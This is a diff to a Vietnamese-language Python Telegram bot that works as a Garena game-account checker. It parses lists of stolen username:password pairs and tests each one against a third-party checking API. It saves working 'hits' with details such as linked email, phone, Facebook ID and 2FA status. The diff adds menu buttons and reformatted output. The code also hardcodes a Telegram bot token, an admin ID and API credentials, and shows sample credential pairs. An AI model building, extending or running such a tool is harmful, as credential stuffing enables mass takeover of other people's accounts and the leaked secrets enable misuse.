@@ -1,4 +1,4 @@
-# bot.py - GARENA CHECKER BOT - CHECK ĐƠN + NÚT CHỌN SERVICE
+# bot.py - GARENA CHECKER BOT - NÂNG CẤP NÚT LỌC TK MK TỪ TXT
 import subprocess
 import sys
 import importlib
@@ -11,7 +11,7 @@ import telebot
 import requests
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
 
 def install_package(package_name):
     try:
@@ -28,6 +28,7 @@ for pkg in ["requests", "pyTelegramBotAPI"]:
 # ========== CẤU HÌNH ==========
 TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
 ADMIN_CHAT_ID = "5736655322"
+ADMIN_USERNAME = "baohuyno1"
 
 API_BASE = "https://lol.nhatminh301.com"
 API_USERNAME = "thaituduc"
@@ -41,6 +42,7 @@ OUTPUT_HITS = "hits.txt"
 OUTPUT_DEAD = "dead.txt"
 OUTPUT_FILTERED = "filtered_accounts.txt"
 
+# ========== DANH SÁCH SERVICE ==========
 SERVICE_ROUTES = {
     "lienquan": {
         "route": "/api/lienquan",
@@ -83,10 +85,12 @@ SERVICE_ROUTES = {
 checking = False
 stop_event = threading.Event()
 filtered_accounts = []
-pending_accounts = []  # Lưu accounts đang chờ check
+pending_accounts = []
+pending_type = None
 stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0}
 file_lock = threading.Lock()
 stats_lock = threading.Lock()
+pending_file_content = None  # Lưu nội dung file để lọc
 
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")
 
@@ -95,6 +99,7 @@ def is_admin(chat_id):
 
 # ========== LỌC TK MK ==========
 def loc_tk_mk(content):
+    """Lọc user:pass từ nội dung"""
     accounts = []
     seen = set()
     lines = content.split('\n')
@@ -107,7 +112,8 @@ def loc_tk_mk(content):
         user = None
         pwd = None
         
-        for sep in [':', '|', '/']:
+        # Thử các định dạng
+        for sep in [':', '|', '/', '\t']:
             if sep in line:
                 parts = line.split(sep, 1)
                 user = parts[0].strip()
@@ -115,8 +121,10 @@ def loc_tk_mk(content):
                 break
         
         if user and pwd:
+            # Làm sạch user
             user = re.sub(r'[^\w.@-]', '', user)
             pwd = pwd.strip()
+            
             if len(user) > 0 and len(pwd) > 0:
                 key = f"{user}:{pwd}"
                 if key not in seen:
@@ -166,8 +174,8 @@ def check_account_api(username, password, service):
     
     return {"result": "error", "message": "Request failed"}
 
-# ========== FORMAT HIT ĐẸP ==========
-def format_hit_dep(username, password, data):
+# ========== FORMAT KẾT QUẢ ĐẸP ==========
+def format_hit_dep(username, password, data, service=""):
     if isinstance(data, str):
         try:
             data = json.loads(data)
@@ -176,80 +184,158 @@ def format_hit_dep(username, password, data):
     
     if not isinstance(data, dict):
         return f"""
-━━━━━━━━━ ✅ HIT ━━━━━━━━━
-🔑 <code>{username}:{password}</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━
+╔══════════════════════════════════╗
+║          ✅ HIT                   ║
+╠══════════════════════════════════╣
+║ 🔑 {username}:{password}
+╚══════════════════════════════════╝
 """
     
-    uid = data.get("uid", "N/A")
-    name = data.get("name", data.get("nickname", data.get("aov_name", "N/A")))
-    region = data.get("region", "VN")
-    shells = data.get("shells", data.get("so", 0))
-    nap_so = data.get("nap_so", data.get("last_recharge", "N/A"))
-    email = data.get("email", data.get("mail", ""))
-    email_verified = data.get("email_verified", data.get("mail_verified", False))
-    mobile = data.get("mobile", data.get("sdt", ""))
-    mobile_bound = data.get("mobile_bound", data.get("sdt_bound", False))
-    password_set = data.get("password_set", True)
-    fb_linked = data.get("fb_linked", data.get("fb", False))
-    fb_id = data.get("fb_id", data.get("fb_id", ""))
-    aov_banned = data.get("aov_banned", data.get("banned", "NO"))
-    last_login = data.get("last_login", data.get("last_login", "N/A"))
-    created = data.get("created", data.get("tao_gr", data.get("created_at", "N/A")))
-    aov_rank = data.get("aov_rank", data.get("rank", "N/A"))
-    aov_level = data.get("aov_level", data.get("level", 0))
-    aov_total_skins = data.get("aov_total_skins", data.get("skin", data.get("skins", 0)))
-    aov_total_champs = data.get("aov_total_champs", data.get("hero", data.get("champs", 0)))
-    qh = data.get("qh", data.get("quan_he", 0))
-    cccd = data.get("cccd", data.get("cmnd", "No"))
-    authen = data.get("authen", data.get("2fa", "No"))
+    uid = data.get("uid", data.get("id", "N/A"))
+    name = data.get("name", data.get("nickname", data.get("aov_name", data.get("display_name", "N/A"))))
+    region = data.get("region", data.get("country", "VN"))
     
-    email_str = f"Yes [{email[:3]}***@{email.split('@')[1] if '@' in email else 'gmail.com'}] [ĐÃ XÁC THỰC]" if email_verified else "No"
-    sdt_str = f"Yes [{mobile[:4]}***{mobile[-3:] if len(mobile) > 3 else ''}]" if mobile_bound else "No"
-    pass_str = "Yes" if password_set else "No"
-    fb_str = f"YES [{fb_id}]" if fb_linked else "NO"
-    band_str = "YES" if str(aov_banned).upper() in ["YES", "TRUE", "1", "BANNED"] else "NO"
-    cccd_str = "Yes" if cccd and cccd != "No" else "No"
-    authen_str = "Yes" if authen and authen != "No" else "No"
-    status_str = "Acc Có FB" if fb_linked else "Acc Thường"
+    shells = data.get("shells", data.get("so", data.get("coins", 0)))
+    nap_so = data.get("nap_so", data.get("last_recharge", data.get("recharge", "N/A")))
+    
+    email = data.get("email", data.get("mail", data.get("email_address", "")))
+    email_verified = data.get("email_verified", data.get("mail_verified", data.get("email_verified", False)))
+    email_str = "✅ Đã xác thực" if email_verified else "❌ Chưa xác thực"
+    if email:
+        email_display = f"{email[:3]}***@{email.split('@')[1] if '@' in email else 'gmail.com'}"
+    else:
+        email_display = "Không có"
+    
+    mobile = data.get("mobile", data.get("sdt", data.get("phone", "")))
+    mobile_bound = data.get("mobile_bound", data.get("sdt_bound", data.get("phone_verified", False)))
+    if mobile_bound and mobile:
+        mobile_display = f"{mobile[:4]}***{mobile[-3:] if len(mobile) > 3 else ''}"
+    else:
+        mobile_display = "Chưa liên kết"
+    
+    password_set = data.get("password_set", data.get("has_password", True))
+    pass_str = "✅ Có" if password_set else "❌ Không"
+    
+    fb_linked = data.get("fb_linked", data.get("fb", data.get("facebook_linked", False)))
+    fb_id = data.get("fb_id", data.get("facebook_id", ""))
+    if fb_linked and fb_id:
+        fb_str = f"✅ Liên kết [{fb_id}]"
+    elif fb_linked:
+        fb_str = "✅ Đã liên kết"
+    else:
+        fb_str = "❌ Chưa liên kết"
+    
+    aov_banned = data.get("aov_banned", data.get("banned", data.get("is_banned", "NO")))
+    band_str = "🔴 BANNED" if str(aov_banned).upper() in ["YES", "TRUE", "1", "BANNED"] else "🟢 Bình thường"
+    
+    last_login = data.get("last_login", data.get("last_login_time", data.get("login_last", "N/A")))
+    created = data.get("created", data.get("tao_gr", data.get("created_at", data.get("register_time", "N/A"))))
+    
+    aov_rank = data.get("aov_rank", data.get("rank", data.get("tier", "N/A")))
+    aov_level = data.get("aov_level", data.get("level", data.get("lv", 0)))
+    aov_total_skins = data.get("aov_total_skins", data.get("skin", data.get("skins", data.get("total_skins", 0))))
+    aov_total_champs = data.get("aov_total_champs", data.get("hero", data.get("champs", data.get("heroes", 0))))
+    
+    qh = data.get("qh", data.get("quan_he", data.get("friends", 0)))
+    cccd = data.get("cccd", data.get("cmnd", data.get("id_card", "No")))
+    authen = data.get("authen", data.get("2fa", data.get("two_factor", "No")))
+    
+    cccd_str = "✅ Có" if cccd and cccd != "No" else "❌ Không"
+    authen_str = "✅ Có" if authen and authen != "No" else "❌ Không"
+    
+    status_parts = []
+    if fb_linked:
+        status_parts.append("FB")
+    if mobile_bound:
+        status_parts.append("SĐT")
+    if email_verified:
+        status_parts.append("Email")
+    if password_set:
+        status_parts.append("Pass")
+    
+    status_str = " | ".join(status_parts) if status_parts else "Acc thường"
+    
+    service_icon = SERVICE_ROUTES.get(service, {}).get("icon", "🎮")
     
     return f"""
-━━━━━━━━━ ✅ HIT ━━━━━━━━━
-🔑 <code>{username}:{password}</code>
-👤 UID: <code>{uid}</code>
-👤 Nickname: <code>{name}</code>
-🌐 Region: <code>{region}</code>
-💲 Sò: <code>{shells}</code>
-💰 Nạp sò: <code>{nap_so}</code>
-📩 EMAIL: {email_str}
-📱 SĐT: {sdt_str}
-🛡 PASS: {pass_str}
-🔗 FB: {fb_str}
-🚫 BAND: {band_str}
-⏰ Login cuối: <code>{last_login}</code>
-📅 Tạo GR: <code>{created}</code>
-🔥 NAME: <code>{name}</code>
-👑 RANK: <code>{aov_rank}</code>
-✨ LEVEL: <code>{aov_level}</code>
-💎 SKIN: <code>{aov_total_skins}</code>
-💪 HERO: <code>{aov_total_champs}</code>
-⚡️ QH: <code>{qh}</code>
-📄 CCCD: {cccd_str}
-🛡 Authen: {authen_str}
-📋 Tình Trạng: {status_str}
-━━━━━━━━━━━━━━━━━━━━━━━━━
+╔══════════════════════════════════╗
+║          ✅ HIT                   ║
+╠══════════════════════════════════╣
+║ {service_icon} Service: {service.upper()}
+║ 🔑 {username}:{password}
+║ ────────────────────────────────
+║ 🆔 UID: {uid}
+║ 👤 Nick: {name}
+║ 🌐 Region: {region}
+║ 💲 Sò: {shells}
+║ 💰 Nạp: {nap_so}
+║ ────────────────────────────────
+║ 📩 Email: {email_display} {email_str}
+║ 📱 SĐT: {mobile_display}
+║ 🛡 Pass: {pass_str}
+║ 🔗 FB: {fb_str}
+║ ────────────────────────────────
+║ ⚠️ Status: {band_str}
+║ ⏰ Login cuối: {last_login}
+║ 📅 Tạo GR: {created}
+║ ────────────────────────────────
+║ 👑 Rank: {aov_rank}
+║ ✨ Level: {aov_level}
+║ 💎 Skin: {aov_total_skins}
+║ ⚔️ Hero: {aov_total_champs}
+║ 👥 Friends: {qh}
+║ ────────────────────────────────
+║ 📄 CCCD: {cccd_str}
+║ 🔐 2FA: {authen_str}
+║ 📋 Status: {status_str}
+╚══════════════════════════════════╝
 """
 
-def format_dead_dep(username, password):
+def format_dead_dep(username, password, service=""):
+    service_icon = SERVICE_ROUTES.get(service, {}).get("icon", "🎮")
     return f"""
-━━━━━━━━━ ❌ DEAD ━━━━━━━━━
-🔑 <code>{username}:{password}</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━
+╔══════════════════════════════════╗
+║          ❌ DEAD                 ║
+╠══════════════════════════════════╣
+║ {service_icon} Service: {service.upper()}
+║ 🔑 {username}:{password}
+║ ────────────────────────────────
+║ ⚠️ Tài khoản không hợp lệ
+╚══════════════════════════════════╝
 """
 
-# ========== TẠO NÚT CHỌN SERVICE ==========
+def format_error_dep(username, password, service=""):
+    service_icon = SERVICE_ROUTES.get(service, {}).get("icon", "🎮")
+    return f"""
+╔══════════════════════════════════╗
+║          ⚠️ ERROR                ║
+╠══════════════════════════════════╣
+║ {service_icon} Service: {service.upper()}
+║ 🔑 {username}:{password}
+║ ────────────────────────────────
+║ ❌ Lỗi khi check
+╚══════════════════════════════════╝
+"""
+
+# ========== TẠO NÚT BẤM ==========
+def create_main_keyboard():
+    """Tạo bàn phím chính"""
+    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    buttons = [
+        KeyboardButton("📝 Gửi TK MK"),
+        KeyboardButton("📁 Gửi File TXT"),
+        KeyboardButton("🔍 Lọc TK MK từ TXT"),
+        KeyboardButton("📊 Trạng thái"),
+        KeyboardButton("📥 Tải Hits"),
+        KeyboardButton("📥 Tải Dead"),
+        KeyboardButton("⏹ Dừng check"),
+        KeyboardButton("👤 Admin")
+    ]
+    keyboard.add(*buttons)
+    return keyboard
+
 def create_service_keyboard():
-    """Tạo bàn phím chọn service"""
+    """Tạo bàn phím inline chọn service"""
     keyboard = InlineKeyboardMarkup(row_width=2)
     buttons = []
     
@@ -260,15 +346,36 @@ def create_service_keyboard():
         )
         buttons.append(btn)
     
-    # Thêm nút hủy
-    buttons.append(InlineKeyboardButton("❌ Hủy", callback_data="cancel_check"))
+    keyboard.add(*buttons)
     
+    keyboard.row(
+        InlineKeyboardButton("📥 Hits", callback_data="get_hits"),
+        InlineKeyboardButton("📥 Dead", callback_data="get_dead"),
+        InlineKeyboardButton("⏹ Stop", callback_data="stop_check")
+    )
+    keyboard.row(
+        InlineKeyboardButton("❌ Hủy", callback_data="cancel_check")
+    )
+    
+    return keyboard
+
+def create_admin_keyboard():
+    """Tạo bàn phím admin"""
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    buttons = [
+        InlineKeyboardButton("👤 Admin: @baohuyno1", url="https://t.me/baohuyno1"),
+        InlineKeyboardButton("📊 Trạng thái", callback_data="admin_status"),
+        InlineKeyboardButton("📥 Hits", callback_data="admin_hits"),
+        InlineKeyboardButton("📥 Dead", callback_data="admin_dead"),
+        InlineKeyboardButton("⏹ Dừng check", callback_data="admin_stop"),
+        InlineKeyboardButton("🗑 Xóa pending", callback_data="admin_clear"),
+        InlineKeyboardButton("📋 Danh sách service", callback_data="admin_services")
+    ]
     keyboard.add(*buttons)
     return keyboard
 
 # ========== CHECK ĐƠN ==========
 def check_single_account(chat_id, username, password, service="lienquan"):
-    """Check 1 account đơn lẻ"""
     service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
     bot.send_message(chat_id, f"🔍 Đang check <code>{username}:{password}</code> với {service_desc}...")
     
@@ -279,19 +386,14 @@ def check_single_account(chat_id, username, password, service="lienquan"):
         with file_lock:
             with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
                 f.write(f"{username}:{password}\n")
-        bot.send_message(chat_id, format_hit_dep(username, password, result))
+        bot.send_message(chat_id, format_hit_dep(username, password, result, service))
     elif result_type == "dead":
         with file_lock:
             with open(OUTPUT_DEAD, 'a', encoding='utf-8') as f:
                 f.write(f"{username}:{password}\n")
-        bot.send_message(chat_id, format_dead_dep(username, password))
+        bot.send_message(chat_id, format_dead_dep(username, password, service))
     else:
-        bot.send_message(chat_id, f"""
-━━━━━━━━━ ⚠️ UNKNOWN ━━━━━━━━━
-🔑 <code>{username}:{password}</code>
-📌 Lỗi: Không xác định được trạng thái
-━━━━━━━━━━━━━━━━━━━━━━━━━
-""")
+        bot.send_message(chat_id, format_error_dep(username, password, service))
 
 # ========== CHECK NHIỀU ACCOUNT ==========
 def check_accounts_batch(chat_id, accounts, service):
@@ -340,7 +442,7 @@ def check_accounts_batch(chat_id, accounts, service):
                     with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
                         f.write(f"{user}:{pwd}\n")
                 try:
-                    bot.send_message(chat_id, format_hit_dep(user, pwd, result))
+                    bot.send_message(chat_id, format_hit_dep(user, pwd, result, service))
                 except:
                     pass
             elif result_type == "dead":
@@ -395,7 +497,7 @@ def check_accounts_batch(chat_id, accounts, service):
 # ========== XỬ LÝ CALLBACK ==========
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
-    global pending_accounts, filtered_accounts
+    global pending_accounts, filtered_accounts, checking
     
     if not is_admin(call.message.chat.id):
         bot.answer_callback_query(call.id, "❌ Bạn không có quyền!")
@@ -410,7 +512,6 @@ def handle_callback(call):
             bot.answer_callback_query(call.id, "❌ Service không hợp lệ!")
             return
         
-        # Xóa tin nhắn cũ
         try:
             bot.delete_message(call.message.chat.id, call.message.message_id)
         except:
@@ -419,23 +520,94 @@ def handle_callback(call):
         service_desc = SERVICE_ROUTES[service]["desc"]
         icon = SERVICE_ROUTES[service]["icon"]
         
-        # Kiểm tra accounts
         if pending_accounts:
             accounts = pending_accounts
             pending_accounts = []
             
             if len(accounts) == 1:
-                # Check đơn
                 user, pwd = accounts[0]
                 bot.send_message(call.message.chat.id, f"{icon} Đang check <code>{user}:{pwd}</code> với {service_desc}...")
                 threading.Thread(target=check_single_account, args=(call.message.chat.id, user, pwd, service)).start()
             else:
-                # Check batch
                 filtered_accounts = accounts
                 bot.send_message(call.message.chat.id, f"{icon} Đang check {len(accounts)} acc với {service_desc}...")
                 threading.Thread(target=check_accounts_batch, args=(call.message.chat.id, accounts, service)).start()
         else:
             bot.answer_callback_query(call.id, "❌ Không có accounts để check!")
+    
+    elif data == "admin_status":
+        if checking:
+            elapsed = time.time() - stats.get("start_time", time.time())
+            speed = stats["checked"] / elapsed if elapsed > 0 else 0
+            bot.send_message(call.message.chat.id, f"""
+📊 <b>TRẠNG THÁI</b>
+🔄 Đang check: <b>YES</b>
+✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
+🔴 HIT: <code>{stats['hits']}</code>
+❌ DEAD: <code>{stats['dead']}</code>
+⚡ Speed: <code>{speed:.1f}</code> acc/s
+⏱ Thời gian: <code>{elapsed:.0f}s</code>
+""")
+        else:
+            bot.send_message(call.message.chat.id, "💤 Bot đang rảnh")
+        bot.answer_callback_query(call.id)
+    
+    elif data == "admin_hits":
+        try:
+            with open(OUTPUT_HITS, 'rb') as f:
+                bot.send_document(call.message.chat.id, f, caption="✅ hits.txt")
+        except:
+            bot.send_message(call.message.chat.id, "❌ Chưa có hits!")
+        bot.answer_callback_query(call.id)
+    
+    elif data == "admin_dead":
+        try:
+            with open(OUTPUT_DEAD, 'rb') as f:
+                bot.send_document(call.message.chat.id, f, caption="❌ dead.txt")
+        except:
+            bot.send_message(call.message.chat.id, "❌ Chưa có dead!")
+        bot.answer_callback_query(call.id)
+    
+    elif data == "admin_stop":
+        stop_event.set()
+        checking = False
+        bot.send_message(call.message.chat.id, "🛑 Đã dừng check!")
+        bot.answer_callback_query(call.id)
+    
+    elif data == "admin_clear":
+        pending_accounts = []
+        bot.send_message(call.message.chat.id, "✅ Đã xóa danh sách pending!")
+        bot.answer_callback_query(call.id)
+    
+    elif data == "admin_services":
+        msg = "📋 <b>DANH SÁCH SERVICE</b>\n\n"
+        for key, value in SERVICE_ROUTES.items():
+            msg += f"{value['icon']} <b>{value['desc']}</b>\n"
+            msg += f"   Route: <code>{value['route']}</code>\n\n"
+        bot.send_message(call.message.chat.id, msg)
+        bot.answer_callback_query(call.id)
+    
+    elif data == "get_hits":
+        try:
+            with open(OUTPUT_HITS, 'rb') as f:
+                bot.send_document(call.message.chat.id, f, caption="✅ hits.txt")
+        except:
+            bot.send_message(call.message.chat.id, "❌ Chưa có hits!")
+        bot.answer_callback_query(call.id)
+    
+    elif data == "get_dead":
+        try:
+            with open(OUTPUT_DEAD, 'rb') as f:
+                bot.send_document(call.message.chat.id, f, caption="❌ dead.txt")
+        except:
+            bot.send_message(call.message.chat.id, "❌ Chưa có dead!")
+        bot.answer_callback_query(call.id)
+    
+    elif data == "stop_check":
+        stop_event.set()
+        checking = False
+        bot.send_message(call.message.chat.id, "🛑 Đã dừng check!")
+        bot.answer_callback_query(call.id)
     
     elif data == "cancel_check":
         pending_accounts = []
@@ -444,20 +616,139 @@ def handle_callback(call):
         except:
             pass
         bot.send_message(call.message.chat.id, "❌ Đã hủy check!")
+        bot.answer_callback_query(call.id)
     
     bot.answer_callback_query(call.id)
 
-# ========== XỬ LÝ TEXT - GỬI TK MK ==========
+# ========== XỬ LÝ LỆNH LỌC TK MK ==========
+@bot.message_handler(commands=['loc'])
+def cmd_loc(message):
+    if not is_admin(message.chat.id):
+        return
+    
+    bot.reply_to(message, """
+🔍 <b>LỌC TK MK TỪ TXT</b>
+
+📌 <b>CÁCH DÙNG:</b>
+1️⃣ Nhấn nút <b>"🔍 Lọc TK MK từ TXT"</b>
+2️⃣ Gửi file .txt chứa danh sách
+3️⃣ Bot tự động lọc ra user:pass
+
+📌 <b>HỖ TRỢ ĐỊNH DẠNG:</b>
+• <code>user:pass</code>
+• <code>user|pass</code>
+• <code>user/pass</code>
+• <code>user    pass</code> (tab)
+
+📌 <b>VÍ DỤ:</b>
+<code>ZzkeconzZ:thanhoppa2001</code>
+<code>anhduckim1|kimanhduc1</code>
+<code>trannamtrungzzz/cuong2001</code>
+""")
+
+# ========== XỬ LÝ TEXT ==========
 @bot.message_handler(content_types=['text'])
 def handle_text(message):
     if not is_admin(message.chat.id):
         return
     
     text = message.text.strip()
+    
+    # Xử lý nút bấm
+    if text == "📝 Gửi TK MK":
+        bot.reply_to(message, """
+📌 <b>GỬI TK MK</b>
+Gửi trực tiếp <code>user:pass</code> hoặc nhiều accounts
+
+VD:
+<code>user1:pass123</code>
+<code>user2:pass456</code>
+<code>user3:pass789</code>
+""")
+        return
+    
+    elif text == "📁 Gửi File TXT":
+        bot.reply_to(message, """
+📌 <b>GỬI FILE TXT</b>
+Gửi file .txt chứa danh sách tk mk
+Bot sẽ tự động lọc và hiển thị nút chọn service
+""")
+        return
+    
+    elif text == "🔍 Lọc TK MK từ TXT":
+        bot.reply_to(message, """
+🔍 <b>LỌC TK MK TỪ TXT</b>
+
+📌 Gửi file .txt chứa danh sách tài khoản
+Bot sẽ lọc chỉ giữ lại <code>user:pass</code>
+
+📌 Hỗ trợ định dạng:
+• <code>user:pass</code>
+• <code>user|pass</code>
+• <code>user/pass</code>
+
+📌 Sau khi lọc xong, chọn service để check!
+""")
+        return
+    
+    elif text == "📊 Trạng thái":
+        if checking:
+            elapsed = time.time() - stats.get("start_time", time.time())
+            speed = stats["checked"] / elapsed if elapsed > 0 else 0
+            bot.reply_to(message, f"""
+📊 <b>TRẠNG THÁI</b>
+🔄 Đang check: <b>YES</b>
+✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
+🔴 HIT: <code>{stats['hits']}</code>
+❌ DEAD: <code>{stats['dead']}</code>
+⚡ Speed: <code>{speed:.1f}</code> acc/s
+⏱ Thời gian: <code>{elapsed:.0f}s</code>
+""")
+        else:
+            bot.reply_to(message, "💤 Bot đang rảnh")
+        return
+    
+    elif text == "📥 Tải Hits":
+        try:
+            with open(OUTPUT_HITS, 'rb') as f:
+                bot.send_document(message.chat.id, f, caption="✅ hits.txt")
+        except:
+            bot.reply_to(message, "❌ Chưa có hits!")
+        return
+    
+    elif text == "📥 Tải Dead":
+        try:
+            with open(OUTPUT_DEAD, 'rb') as f:
+                bot.send_document(message.chat.id, f, caption="❌ dead.txt")
+        except:
+            bot.reply_to(message, "❌ Chưa có dead!")
+        return
+    
+    elif text == "⏹ Dừng check":
+        stop_event.set()
+        checking = False
+        bot.reply_to(message, "🛑 Đã dừng check!")
+        return
+    
+    elif text == "👤 Admin":
+        bot.send_message(message.chat.id, """
+👤 <b>ADMIN</b>
+📌 Admin: @baohuyno1
+🔗 Liên hệ: https://t.me/baohuyno1
+
+📋 <b>CHỨC NĂNG ADMIN:</b>
+• Quản lý bot
+• Xem trạng thái
+• Tải hits/dead
+• Dừng check
+• Xóa pending
+""", reply_markup=create_admin_keyboard())
+        return
+    
+    # Xử lý tk mk
     if text.startswith('/'):
         return
     
-    # Lọc tk mk
     accounts = loc_tk_mk(text)
     
     if not accounts:
@@ -470,11 +761,9 @@ Format đúng: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code
 """)
         return
     
-    # Lưu accounts vào pending
     global pending_accounts
     pending_accounts = accounts
     
-    # Tạo preview
     preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
     total = len(accounts)
     
@@ -488,62 +777,7 @@ Format đúng: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code
 👇 <b>Chọn service để check:</b>
 """
     
-    # Gửi tin nhắn với nút chọn
     bot.send_message(message.chat.id, msg, reply_markup=create_service_keyboard())
-
-# ========== LỆNH /start ==========
-@bot.message_handler(commands=['start'])
-def cmd_start(message):
-    if not is_admin(message.chat.id):
-        return
-    
-    bot.send_message(message.chat.id, f"""
-🤖 <b>GARENA CHECKER BOT</b>
-
-📌 <b>CÁCH DÙNG:</b>
-
-1️⃣ <b>GỬI TK MK</b>
-Gửi trực tiếp <code>user:pass</code>
-→ Chọn service bằng nút bấm
-
-2️⃣ <b>LỌC TK MK TỪ FILE</b>
-<code>/loc</code> - Hướng dẫn
-
-3️⃣ <b>CHECK HÀNG LOẠT</b>
-Gửi nhiều accounts
-→ Chọn service bằng nút bấm
-
-📌 <b>LỆNH KHÁC:</b>
-<code>/hits</code> - Tải hits.txt
-<code>/dead</code> - Tải dead.txt
-<code>/status</code> - Trạng thái
-<code>/stop</code> - Dừng check
-<code>/clear</code> - Xóa pending
-
-⚡ <b>THREADS:</b> {DEFAULT_THREADS}
-""")
-
-# ========== LỆNH /loc ==========
-@bot.message_handler(commands=['loc'])
-def cmd_loc(message):
-    if not is_admin(message.chat.id):
-        return
-    
-    bot.reply_to(message, """
-📌 <b>LỌC TK MK TỪ TXT</b>
-
-Gửi file .txt chứa danh sách tk mk
-Bot lọc chỉ giữ <code>user:pass</code>
-
-Hỗ trợ định dạng: <code>:</code> <code>|</code> <code>/</code>
-
-VD nội dung:
-<code>user1:pass123</code>
-<code>user2|pass456</code>
-<code>user3/pass789</code>
-
-Sau khi gửi file, chọn service bằng nút bấm!
-""")
 
 # ========== XỬ LÝ FILE ==========
 @bot.message_handler(content_types=['document'])
@@ -591,73 +825,53 @@ def handle_document(message):
     except Exception as e:
         bot.reply_to(message, f"❌ Lỗi: {e}")
 
-# ========== LỆNH KHÁC ==========
-@bot.message_handler(commands=['hits'])
-def cmd_hits(message):
-    if not is_admin(message.chat.id):
-        return
-    try:
-        with open(OUTPUT_HITS, 'rb') as f:
-            bot.send_document(message.chat.id, f, caption="✅ hits.txt")
-    except:
-        bot.reply_to(message, "❌ Chưa có hits!")
-
-@bot.message_handler(commands=['dead'])
-def cmd_dead(message):
-    if not is_admin(message.chat.id):
-        return
-    try:
-        with open(OUTPUT_DEAD, 'rb') as f:
-            bot.send_document(message.chat.id, f, caption="❌ dead.txt")
-    except:
-        bot.reply_to(message, "❌ Chưa có dead!")
-
-@bot.message_handler(commands=['status'])
-def cmd_status(message):
+# ========== LỆNH /start ==========
+@bot.message_handler(commands=['start'])
+def cmd_start(message):
     if not is_admin(message.chat.id):
         return
     
-    if checking:
-        elapsed = time.time() - stats.get("start_time", time.time())
-        speed = stats["checked"] / elapsed if elapsed > 0 else 0
-        bot.reply_to(message, f"""
-📊 <b>TRẠNG THÁI</b>
-🔄 Đang check: <b>YES</b>
-✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
-🔴 HIT: <code>{stats['hits']}</code>
-❌ DEAD: <code>{stats['dead']}</code>
-⚡ Speed: <code>{speed:.1f}</code> acc/s
-⏱ Thời gian: <code>{elapsed:.0f}s</code>
-""")
-    else:
-        bot.reply_to(message, "💤 Bot đang rảnh")
+    bot.send_message(message.chat.id, f"""
+🤖 <b>GARENA CHECKER BOT</b>
+👤 Admin: <a href="https://t.me/baohuyno1">@baohuyno1</a>
 
-@bot.message_handler(commands=['stop'])
-def cmd_stop(message):
-    if not is_admin(message.chat.id):
-        return
-    global checking
-    stop_event.set()
-    checking = False
-    bot.reply_to(message, "🛑 Đã dừng check!")
+📌 <b>CÁCH DÙNG:</b>
 
-@bot.message_handler(commands=['clear'])
-def cmd_clear(message):
-    if not is_admin(message.chat.id):
-        return
-    global pending_accounts
-    pending_accounts = []
-    bot.reply_to(message, "✅ Đã xóa danh sách pending!")
+1️⃣ <b>GỬI TK MK</b>
+Gửi trực tiếp <code>user:pass</code>
+→ Chọn service bằng nút bấm
+
+2️⃣ <b>GỬI FILE TXT</b>
+Gửi file .txt chứa danh sách
+→ Chọn service bằng nút bấm
+
+3️⃣ <b>LỌC TK MK TỪ TXT</b>
+Nhấn nút <b>"🔍 Lọc TK MK từ TXT"</b>
+→ Gửi file .txt để lọc
+
+4️⃣ <b>SỬ DỤNG NÚT</b>
+• 📝 Gửi TK MK - Hướng dẫn
+• 📁 Gửi File TXT - Hướng dẫn
+• 🔍 Lọc TK MK từ TXT - Lọc file
+• 📊 Trạng thái - Xem tiến độ
+• 📥 Tải Hits - Tải hits.txt
+• 📥 Tải Dead - Tải dead.txt
+• ⏹ Dừng check - Dừng check
+• 👤 Admin - Liên hệ admin
+
+⚡ <b>THREADS:</b> {DEFAULT_THREADS}
+""", reply_markup=create_main_keyboard())
 
 # ========== MAIN ==========
 def main():
     print("=" * 60)
     print("    GARENA CHECKER BOT")
-    print("    CHECK ĐƠN + NÚT CHỌN SERVICE")
+    print("    ADMIN: @baohuyno1")
     print("=" * 60)
     print(f"[*] Threads: {DEFAULT_THREADS}")
     print(f"[*] Services: {len(SERVICE_ROUTES)}")
     print("[*] Format: user:pass")
+    print("[*] Nút lọc TK MK từ TXT đã được thêm!")
     print("=" * 60)
     
     try:
@@ -665,9 +879,11 @@ def main():
 🤖 Bot đã khởi động!
 
 📌 CÁCH DÙNG:
-• Gửi user:pass -> Chọn service bằng nút
-• Gửi file .txt -> Chọn service bằng nút
-• /loc -> Hướng dẫn lọc file
+• Gửi user:pass -> Chọn service
+• Gửi file .txt -> Chọn service
+• Nhấn "🔍 Lọc TK MK từ TXT" -> Gửi file để lọc
+
+👤 Admin: @baohuyno1
 """)
     except:
         pass
